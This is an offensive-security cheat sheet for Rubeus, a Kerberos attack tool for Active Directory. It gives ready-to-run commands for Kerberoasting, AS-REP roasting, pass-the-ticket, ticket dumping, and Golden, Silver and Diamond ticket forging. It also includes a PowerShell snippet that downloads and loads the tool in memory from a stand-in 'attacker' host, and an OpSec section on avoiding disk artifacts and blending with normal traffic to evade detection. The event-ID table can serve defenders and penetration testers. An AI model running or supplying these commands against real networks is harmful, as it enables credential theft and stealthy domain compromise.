---
title: Rubeus
category: tool
tags:
  - active-directory
  - kerberos
  - credential-attacks
  - windows
  - post-exploitation
sources:
  - name: GitHub Repository
    url: https://github.com/GhostPack/Rubeus
  - name: HarmJ0y Blog
    url: https://blog.harmj0y.net/category/rubeus/
last_updated: 2025-12-27
---

# Rubeus

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Common Commands](#common-commands)
- [Documentation](#documentation)
- [OpSec Considerations](#opsec-considerations)

## Overview

Rubeus is a C# toolset for raw Kerberos interaction and abuse. It provides extensive capabilities for Kerberos ticket manipulation, attacks, and credential extraction in Active Directory environments.

**Key Capabilities:**

- **Ticket Operations**: Request, renew, and manipulate TGT/TGS tickets
- **Kerberoasting**: Extract service ticket hashes for offline cracking
- **AS-REP Roasting**: Target accounts without pre-authentication
- **Pass-the-Ticket**: Inject tickets into current session
- **Delegation Abuse**: Exploit constrained and resource-based delegation
- **Ticket Forging**: Create Golden, Silver, and Diamond tickets
- **Ticket Harvesting**: Monitor and extract tickets from memory

Rubeus operates entirely within managed code (C#), making it suitable for in-memory execution and avoiding disk-based detection.

## Installation

### Pre-compiled Binary

Download from [GhostPack releases](https://github.com/GhostPack/Rubeus/releases) or compile from source.

### Compile from Source

```powershell
# Clone repository
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus

# Build with Visual Studio
# Open Rubeus.sln and build in Release mode

# Or use MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe Rubeus.sln /p:Configuration=Release
```

### In-Memory Execution

```powershell
# Load assembly directly (avoids disk)
$data = (New-Object Net.WebClient).DownloadData('http://attacker/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("triage".Split())

# Via Cobalt Strike
execute-assembly /path/to/Rubeus.exe triage
```

## Quick Start

```powershell
# List all Kerberos tickets in current session
Rubeus.exe triage

# Request TGT with password
Rubeus.exe asktgt /user:admin /password:Pass123! /domain:corp.local

# Request TGT with NTLM hash (Overpass-the-Hash)
Rubeus.exe asktgt /user:admin /rc4:HASH /domain:corp.local /ptt

# Kerberoast all roastable users
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roast users without pre-auth
Rubeus.exe asreproast /outfile:asrep.txt

# Pass-the-Ticket from base64 blob
Rubeus.exe ptt /ticket:doIFNj[...]

# Dump all tickets from memory (requires elevation)
Rubeus.exe dump
```

## Common Commands

| Command | Description | Elevation Required |
|---------|-------------|-------------------|
| `triage` | List tickets in current logon session | No |
| `klist` | Detailed ticket listing | No |
| `dump` | Dump all tickets from memory | Yes (Admin) |
| `monitor` | Monitor for new tickets | Yes (Admin) |
| `harvest` | Harvest TGTs on interval | Yes (Admin) |
| `asktgt` | Request a TGT | No |
| `asktgs` | Request a TGS | No |
| `renew` | Renew a TGT | No |
| `ptt` | Pass-the-Ticket | No |
| `purge` | Purge tickets | No |
| `kerberoast` | Kerberoasting attack | No |
| `asreproast` | AS-REP Roasting attack | No |
| `s4u` | S4U delegation abuse | No |
| `golden` | Create Golden Ticket | No |
| `silver` | Create Silver Ticket | No |
| `diamond` | Create Diamond Ticket | No |
| `hash` | Calculate Kerberos keys | No |
| `describe` | Parse and describe ticket | No |
| `createnetonly` | Create process with new LUID | Yes (Admin) |

### Output Formats

```powershell
# Base64 ticket output (default)
Rubeus.exe asktgt /user:admin /password:Pass123!

# Save to file
Rubeus.exe asktgt /user:admin /password:Pass123! /outfile:ticket.kirbi

# Inject directly into session
Rubeus.exe asktgt /user:admin /password:Pass123! /ptt

# Create new logon session and inject
Rubeus.exe asktgt /user:admin /password:Pass123! /createnetonly:C:\Windows\System32\cmd.exe /show
```

## Documentation

| File | Description |
|------|-------------|
| [attacks.md](attacks.md) | Kerberos attack techniques (Kerberoasting, AS-REP, delegation abuse, ticket forging) |
| [harvesting.md](harvesting.md) | Ticket extraction, monitoring, and cross-domain attacks |

## OpSec Considerations

### Execution Methods

| Method | Disk Artifact | Detection Risk |
|--------|---------------|----------------|
| Direct execution | Yes (EXE on disk) | High |
| `execute-assembly` (C2) | No | Medium |
| Reflective loading | No | Medium |
| BOF version | No | Lower |

### Event IDs Generated

| Action | Event ID | Description |
|--------|----------|-------------|
| TGT Request | 4768 | Kerberos AS request |
| TGS Request | 4769 | Kerberos TGS request |
| Kerberoast | 4769 | TGS request for SPN (RC4 indicates attack) |
| Ticket Injection | 4648 | Explicit credential logon |
| Golden Ticket | 4769 | Anomalous TGS without prior 4768 |

### Reducing Detection

```powershell
# Use AES instead of RC4 for ticket requests (less anomalous)
Rubeus.exe asktgt /user:admin /aes256:KEY /domain:corp.local /opsec

# Kerberoast with AES (blends with normal traffic)
Rubeus.exe kerberoast /aes

# Request TGS for specific SPN only (targeted)
Rubeus.exe kerberoast /spn:MSSQLSvc/sql.corp.local:1433

# Use /nowrap for cleaner output parsing
Rubeus.exe kerberoast /nowrap
```

## References

- [GhostPack Rubeus](https://github.com/GhostPack/Rubeus)
- [Rubeus Wiki](https://github.com/GhostPack/Rubeus/wiki)
- [HarmJ0y - Kerberos Attacks](https://blog.harmj0y.net/)
- [SpecterOps - Kerberos Abuse](https://posts.specterops.io/tag/kerberos)
